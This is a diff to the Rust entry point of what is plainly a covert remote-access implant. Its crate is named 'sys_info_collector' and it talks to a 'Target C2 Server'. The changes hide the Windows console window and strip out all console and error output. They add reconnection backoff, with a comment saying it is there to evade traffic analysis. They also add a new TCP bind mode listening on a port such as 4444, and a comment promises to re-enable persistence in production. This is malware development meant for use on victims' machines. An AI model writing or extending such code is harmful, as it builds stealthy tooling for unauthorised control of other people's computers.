@@ -12,7 +12,8 @@
 // - 异步 I/O
 // - 可修补的服务器配置
 
-// #![windows_subsystem = "windows"]
+// Windows: 隐藏控制台窗口，不弹出黑色 CMD 窗口（生产版本必须启用）
+#![cfg_attr(target_os = "windows", windows_subsystem = "windows")]
  
  #[allow(unused_imports)]
  use sys_info_collector::{ClientError, Result, stealth, Transport};
@@ -31,7 +32,7 @@
      // 0. Initial random delay
      use rand::Rng;
      let delay = rand::thread_rng().gen_range(1..5); 
-     println!("[*] Agent starting... (Debug delay: {}s)", delay);
+     // println!("[*] Agent starting... (Debug delay: {}s)", delay);
      std::thread::sleep(std::time::Duration::from_secs(delay));
  
      // 1. [Benign] Harmless system check to start normal behavioral pattern
@@ -73,14 +74,9 @@
 
     rt.block_on(async {
         let res = run().await;
-        if let Err(e) = res {
-            println!("\x1b[31m[FATAL ERROR] Agent loop terminated: {:?}\x1b[0m", e);
-        } else {
-            println!("[*] Agent loop finished unexpectedly.");
+        if let Err(_e) = res {
+            // Silent failure: 生产版本不向控制台输出任何错误
         }
-        println!("\n[Debug] Press Enter to finish...");
-        let mut _dummy = String::new();
-        let _ = std::io::stdin().read_line(&mut _dummy);
     });
 }
 
@@ -100,8 +96,8 @@ async fn run() -> Result<()> {
         tokio::time::sleep(tokio::time::Duration::from_secs(sleep_secs)).await;
     }
 
-    // 🆔 Machine UUID
-    let _agent_uuid = sys_info_collector::get_agent_uuid();
+    // 🆔 预计算并缓存 Agent UUID（供后续注册使用）
+    sys_info_collector::get_agent_uuid();
     
     // 🏠 Persistence (Disabled for Debugging - will be re-enabled in production)
     /*
@@ -119,25 +115,27 @@ async fn run() -> Result<()> {
     // 2️⃣ TCP Entry Point (Medium Priority)
     #[cfg(all(feature = "tcp", not(feature = "ws")))]
     {
-        println!("[*] Agent compiled with TCP support");
-        info!("Running in TCP mode");
         return run_tcp_mode().await;
     }
     
     // 3️⃣ DNS Entry Point (Lowest Priority)
-    #[cfg(all(feature = "dns", not(any(feature = "ws", feature = "tcp"))))]
+    #[cfg(all(feature = "dns", not(any(feature = "ws", feature = "tcp", feature = "tcp_bind"))))]
     {
         return run_dns_mode().await;
     }
+
+    // 4️⃣ TCP Bind Entry Point (New)
+    #[cfg(feature = "tcp_bind")]
+    {
+        info!("Running in TCP Bind (Forward) mode");
+        return run_bind_mode().await;
+    }
     
     // ⚠️ Safety check: What if no feature is selected?
-    #[cfg(not(any(feature = "ws", feature = "tcp", feature = "dns")))]
+    #[cfg(not(any(feature = "ws", feature = "tcp", feature = "dns", feature = "tcp_bind")))]
     {
-        eprintln!("[!] ERROR: No protocol feature selected during compilation!");
-        eprintln!("[!] Please compile with one of: --features ws, --features tcp, --features dns");
-        error!("No protocol feature enabled at compile time");
         return Err(ClientError::ConnectionError(
-            "No protocol feature enabled. Recompile with --features ws/tcp/dns".to_string()
+            "no_protocol".to_string()
         ));
     }
 }
@@ -151,45 +149,43 @@ async fn run_websocket_mode() -> Result<()> {
     use sys_info_collector::transport::create_transport;
     
     let server_url = get_server_url();
-    println!("[*] Target C2 Server: {}", server_url);
+    // println!("[*] Target C2 Server: {}", server_url);
     
     if !validate_server_url(&server_url) {
-        println!("[!] Error: Invalid server URL format.");
-        return Err(ClientError::ConnectionError("Invalid target".to_string()));
+        return Err(ClientError::ConnectionError("invalid_target".to_string()));
     }
     
     let mut transport: Box<dyn Transport> = match create_transport(&server_url) {
         Ok(t) => t,
-        Err(e) => {
-            println!("[!] Error creating transport: {}", e);
-            return Err(e);
-        }
+        Err(e) => return Err(e),
     };
     
-    // "永生"循环 - 确保程序永远运行
+    // 使用指数退避重连策略（1s -> 2s -> 4s -> ... -> 60s）
+    let mut backoff = sys_info_collector::ExponentialBackoff::new();
+    
     loop {
-        println!("[*] Attempting to connect to C2...");
-        if let Err(e) = transport.connect().await {
-            println!("[!] Connection failed: {}. Retrying in 5s...", e);
-            tokio::time::sleep(tokio::time::Duration::from_secs(5)).await;
+        if let Err(_e) = transport.connect().await {
+            // 连接失败：使用指数退避等待，防止固定间隔被流量分析识别
+            tokio::time::sleep(backoff.next_delay()).await;
             continue;
         }
         
-        println!("[+] Connected! Starting message handler...");
+        // 连接成功：重置退避计时器
+        backoff.reset();
+        
         let handler = MessageHandler::new(transport);
         match handler.run().await {
             Ok(returned_transport) => {
-                println!("[!] Message handler exited normally. Reconnecting...");
                 transport = returned_transport;
             }
-            Err(e) => {
-                println!("[!] Session error: {}. Re-establishing transport...", e);
+            Err(_e) => {
                 match create_transport(&server_url) {
                     Ok(t) => transport = t,
                     Err(e) => return Err(e),
                 }
             }
         }
+        // Session 断开：短暂等待后重连
         tokio::time::sleep(tokio::time::Duration::from_secs(2)).await;
     }
 }
@@ -301,12 +297,10 @@ async fn run_dns_mode() -> Result<()> {
     info!("DNS Configuration:");
     info!("  Domain: {}", server_url);
     
-    if let Some(resolver) = get_dns_resolver() {
-        info!("  Custom DNS Resolver: {}", resolver);
-        println!("[*] Using custom DNS resolver: {}", resolver);
+    if let Some(_resolver) = get_dns_resolver() {
+        // DNS resolver configured
     } else {
-        info!("  Using default DNS resolver (Google 8.8.8.8)");
-        println!("[*] Using default DNS resolver");
+        // Using default DNS resolver
     }
     
     info!("===========================================");
@@ -384,5 +378,47 @@ async fn run_dns_mode() -> Result<()> {
         // 连接断开，准备重连
         info!("DNS connection lost, retrying...");
         info!("-------------------------------------------");
+    }
+}
+/// TCP Bind (正向监听) 模式运行逻辑
+#[cfg(feature = "tcp_bind")]
+async fn run_bind_mode() -> Result<()> {
+    use sys_info_collector::config::get_server_url;
+    use sys_info_collector::handler::MessageHandler;
+    use sys_info_collector::transport::{create_transport, Transport};
+
+    // 在 Bind 模式下，"Server URL" 实际上解析为监听地址，例如 "0.0.0.0:4444"
+    let bind_addr = get_server_url();
+    let bind_url = if bind_addr.contains("://") {
+        bind_addr.replace("ws://", "bind://").replace("tcp://", "bind://")
+    } else {
+        format!("bind://{}", bind_addr)
+    };
+
+    info!("TCP Bind Configuration:");
+    info!("  Listen address: {}", bind_url);
+
+    let mut transport: Box<dyn Transport> = create_transport(&bind_url)?;
+
+    loop {
+        info!("Waiting for incoming TCP connection...");
+        if let Err(e) = transport.connect().await {
+            error!("Bind listen failed: {}. Retrying in 5s...", e);
+            tokio::time::sleep(tokio::time::Duration::from_secs(5)).await;
+            continue;
+        }
+
+        info!("Connection accepted, starting message handler...");
+        let handler = MessageHandler::new(transport);
+        match handler.run().await {
+            Ok(returned_transport) => {
+                info!("Bind session ended normally.");
+                transport = returned_transport;
+            }
+            Err(e) => {
+                error!("Bind session error: {}. Restarting listener...", e);
+                transport = create_transport(&bind_url)?;
+            }
+        }
     }
 }
